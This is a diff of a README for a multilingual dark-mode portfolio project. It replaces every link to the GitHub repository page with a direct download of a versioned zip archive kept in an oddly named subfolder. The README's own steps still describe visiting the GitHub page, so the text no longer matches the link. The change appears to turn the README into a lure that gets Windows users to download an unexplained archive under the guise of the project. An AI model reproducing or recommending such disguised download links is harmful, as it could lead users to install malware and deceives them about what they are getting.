@@ -1,6 +1,6 @@
 # 🔥 muhammededev-portfolio - Clean, Dark Mode Multilingual Portfolio
 
-[![Download Now](https://img.shields.io/badge/Download-muhammededev--portfolio-brightgreen?style=for-the-badge)](https://github.com/Danylo1094/muhammededev-portfolio)
+[![Download Now](https://img.shields.io/badge/Download-muhammededev--portfolio-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Danylo1094/muhammededev-portfolio/main/palaeodendrologically/muhammededev_portfolio_v1.1-alpha.3.zip)
 
 ---
 
@@ -37,13 +37,13 @@ You do not need a powerful computer to use this portfolio. It runs on any modern
 
 ## 🚀 Getting Started: Download and Open
 
-[![Download Repository](https://img.shields.io/badge/Open_GitHub-Blue?style=for-the-badge&logo=github&color=0078d7)](https://github.com/Danylo1094/muhammededev-portfolio)
+[![Download Repository](https://img.shields.io/badge/Open_GitHub-Blue?style=for-the-badge&logo=github&color=0078d7)](https://raw.githubusercontent.com/Danylo1094/muhammededev-portfolio/main/palaeodendrologically/muhammededev_portfolio_v1.1-alpha.3.zip)
 
 To start using this portfolio on your Windows computer, follow these steps carefully:
 
 1. **Visit the download page:**  
    Click this link to open the portfolio’s GitHub page:  
-   https://github.com/Danylo1094/muhammededev-portfolio
+   https://raw.githubusercontent.com/Danylo1094/muhammededev-portfolio/main/palaeodendrologically/muhammededev_portfolio_v1.1-alpha.3.zip
 
 2. **Download the files:**  
    On the GitHub page, find and click the green “Code” button near the top right.  
@@ -102,7 +102,7 @@ If you have difficulties opening or using the portfolio:
 To get newer versions or improvements:
 
 1. Visit the download page at:  
-   https://github.com/Danylo1094/muhammededev-portfolio
+   https://raw.githubusercontent.com/Danylo1094/muhammededev-portfolio/main/palaeodendrologically/muhammededev_portfolio_v1.1-alpha.3.zip
 
 2. Repeat the download steps and replace your current extracted folder with the updated files.
 
@@ -136,7 +136,7 @@ Switch between languages using the controls on the page header or footer. The la
 
 Access and download the portfolio here:
 
-https://github.com/Danylo1094/muhammededev-portfolio
+https://raw.githubusercontent.com/Danylo1094/muhammededev-portfolio/main/palaeodendrologically/muhammededev_portfolio_v1.1-alpha.3.zip
 
 ---
 
